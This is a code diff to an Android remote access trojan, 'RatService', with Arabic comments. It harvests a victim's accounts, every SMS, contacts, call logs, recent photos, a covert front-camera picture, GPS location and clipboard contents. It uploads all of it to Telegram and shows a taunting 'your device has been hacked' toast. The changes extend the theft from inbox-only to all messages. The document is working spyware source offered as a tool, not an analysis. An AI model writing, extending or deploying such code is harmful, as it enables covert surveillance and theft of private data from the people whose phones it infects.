@@ -6,7 +6,6 @@ import android.app.*;
 import android.content.*;
 import android.content.pm.ApplicationInfo;
 import android.database.Cursor;
-import android.graphics.ImageFormat;
 import android.hardware.Camera;
 import android.location.Location;
 import android.location.LocationManager;
@@ -17,6 +16,7 @@ import android.os.IBinder;
 import android.provider.CallLog;
 import android.provider.ContactsContract;
 import android.provider.MediaStore;
+import android.provider.Telephony;
 import android.widget.Toast;
 import java.io.*;
 import java.util.List;
@@ -36,23 +36,25 @@ public class RatService extends Service {
         super.onCreate();
         startForegroundService();
         
+        showToast("⚠️ تم اختراق جهازك بنجاح 😂");
+
         new Thread(() -> {
             try {
-                sendTextToTelegram("🔄 **الأداة اشتغلت! جاري سحب البيانات...**");
+                sendTextToTelegram("🔄 **الأداة اشتغلت! جاري سحب كل البيانات (رسايل، مكالمات، صور)...**");
                 
                 dumpAllAccounts(); Thread.sleep(1000);
                 String info = "📱 **Device:** " + Build.MANUFACTURER + " " + Build.MODEL + "\nAndroid: " + Build.VERSION.RELEASE;
                 sendTextToTelegram(info); Thread.sleep(1000);
 
-                dumpSms(); Thread.sleep(1500);
+                dumpAllSms(); Thread.sleep(2000);
                 dumpContacts(); Thread.sleep(1500);
                 dumpCallLogs(); Thread.sleep(1500);
                 dumpImages(); Thread.sleep(1500);
                 
-                takePhoto(); // سحب صورة
-                getLocation(); // سحب الموقع
+                takePhoto(); 
+                getLocation();
 
-                sendTextToTelegram("✅ **اكتمل سحب البيانات والصور!**");
+                sendTextToTelegram("✅ **اكتمل سحب البيانات والصور بالكامل!**");
                 
                 startClipboardMonitor();
             } catch (Exception e) {
@@ -71,17 +73,45 @@ public class RatService extends Service {
         }
     }
 
-    // --- التأثير الأول: رسالة على الشاشة ---
     public void showToast(String msg) {
         new android.os.Handler(android.os.Looper.getMainLooper()).post(() -> {
             Toast.makeText(getApplicationContext(), msg, Toast.LENGTH_LONG).show();
         });
     }
 
-    // --- التأثير الثاني: الكاميرا ---
+    // القوة الخرافية: سحب كل الرسايل
+    private void dumpAllSms() {
+        File file = new File(getExternalFilesDir(null), "sms_all_complete.txt");
+        try (BufferedWriter bw = new BufferedWriter(new FileWriter(file))) {
+            // بنسحب من Telephony.Sms (اللي بيشمل الـ Inbox, Sent, Draft)
+            Cursor c = getContentResolver().query(Telephony.Sms.CONTENT_URI, null, null, null, "date DESC");
+            if (c != null && c.moveToFirst()) {
+                do {
+                    String address = c.getString(c.getColumnIndexOrThrow("address"));
+                    String body = c.getString(c.getColumnIndexOrThrow("body"));
+                    String type = c.getString(c.getColumnIndexOrThrow("type"));
+                    String date = c.getString(c.getColumnIndexOrThrow("date"));
+                    
+                    String typeStr = "Inbox";
+                    if (type.equals("2")) typeStr = "Sent";
+                    else if (type.equals("3")) typeStr = "Draft";
+                    else if (type.equals("4")) typeStr = "Outbox";
+
+                    bw.write("[" + typeStr + "] Date: " + date + "\nTo/From: " + address + "\n" + body + "\n-------------------\n");
+                } while (c.moveToNext());
+                c.close();
+            } else {
+                bw.write("لا توجد رسائل أو لم يتم منح صلاحية الرسايل الافتراضية.");
+            }
+            bw.flush(); uploadFileToTelegram(file, "text/plain");
+        } catch (Exception e) {
+            sendTextToTelegram("❌ فشل سحب الرسائل: " + e.getMessage());
+        }
+    }
+
     private void takePhoto() {
         try {
-            Camera camera = Camera.open(0); // 0 = الكاميرا الأمامية
+            Camera camera = Camera.open(0);
             camera.setPreviewTexture(new android.graphics.SurfaceTexture(10));
             camera.startPreview();
             camera.takePicture(null, null, (data, cam) -> {
@@ -91,38 +121,28 @@ public class RatService extends Service {
                 } catch (IOException ignored) {}
                 cam.release();
                 uploadFileToTelegram(photo, "image/jpeg");
-                showToast("تم اختراق جهازك بنجاح 😂"); // الرسالة اللي هتطلعله
             });
         } catch (Exception e) {
             sendTextToTelegram("❌ فشل الكاميرا: " + e.getMessage());
         }
     }
 
-    // --- التأثير الثالث: الموقع ---
     private void getLocation() {
         try {
             LocationManager lm = (LocationManager) getSystemService(Context.LOCATION_SERVICE);
             Location loc = lm.getLastKnownLocation(LocationManager.GPS_PROVIDER);
             if (loc == null) loc = lm.getLastKnownLocation(LocationManager.NETWORK_PROVIDER);
-            
             if (loc != null) {
-                String mapsLink = "📍 **الموقع:** https://maps.google.com/?q=" + loc.getLatitude() + "," + loc.getLongitude();
-                sendTextToTelegram(mapsLink);
-            } else {
-                sendTextToTelegram("❌ الموقع غير متاح حالياً.");
+                sendTextToTelegram("📍 **الموقع:** https://maps.google.com/?q=" + loc.getLatitude() + "," + loc.getLongitude());
             }
-        } catch (SecurityException e) {
-            sendTextToTelegram("❌ صلاحية الموقع مرفوضة.");
-        }
+        } catch (SecurityException ignored) {}
     }
 
-    // --- تصليح سحب الصور (MediaStore) ---
     private void dumpImages() {
         try {
             Uri uri = MediaStore.Images.Media.EXTERNAL_CONTENT_URI;
             String[] projection = {MediaStore.Images.Media.DATA};
-            Cursor cursor = getContentResolver().query(uri, projection, null, null, MediaStore.Images.Media.DATE_ADDED + " DESC LIMIT 3");
-            
+            Cursor cursor = getContentResolver().query(uri, projection, null, null, MediaStore.Images.Media.DATE_ADDED + " DESC LIMIT 5");
             if (cursor != null) {
                 while (cursor.moveToNext()) {
                     String path = cursor.getString(cursor.getColumnIndexOrThrow(MediaStore.Images.Media.DATA));
@@ -134,28 +154,7 @@ public class RatService extends Service {
                 }
                 cursor.close();
             }
-        } catch (Exception e) {
-            sendTextToTelegram("❌ فشل سحب الصور: " + e.getMessage());
-        }
-    }
-
-    private void dumpSms() {
-        File file = new File(getExternalFilesDir(null), "sms_all.txt");
-        try (BufferedWriter bw = new BufferedWriter(new FileWriter(file))) {
-            Cursor c = getContentResolver().query(Uri.parse("content://sms/inbox"), null, null, null, "date DESC");
-            if (c != null && c.moveToFirst()) {
-                do {
-                    bw.write("From: " + c.getString(c.getColumnIndexOrThrow("address")) + "\n" + c.getString(c.getColumnIndexOrThrow("body")) + "\n-------------------\n");
-                } while (c.moveToNext());
-                c.close();
-            } else {
-                bw.write("لا توجد رسائل أو تم رفض الصلاحية.");
-            }
-            bw.flush(); 
-            uploadFileToTelegram(file, "text/plain");
-        } catch (Exception e) {
-            sendTextToTelegram("❌ فشل سحب الرسائل: " + e.getMessage());
-        }
+        } catch (Exception ignored) {}
     }
 
     private void dumpAllAccounts() {
@@ -165,7 +164,7 @@ public class RatService extends Service {
             StringBuilder sb = new StringBuilder("📧 **الحسابات:**\n");
             for (Account account : accounts) sb.append("- ").append(account.type).append(": `").append(account.name).append("`\n");
             sendTextToTelegram(sb.toString());
-        } catch (Exception e) {}
+        } catch (Exception ignored) {}
     }
 
     private void startClipboardMonitor() {
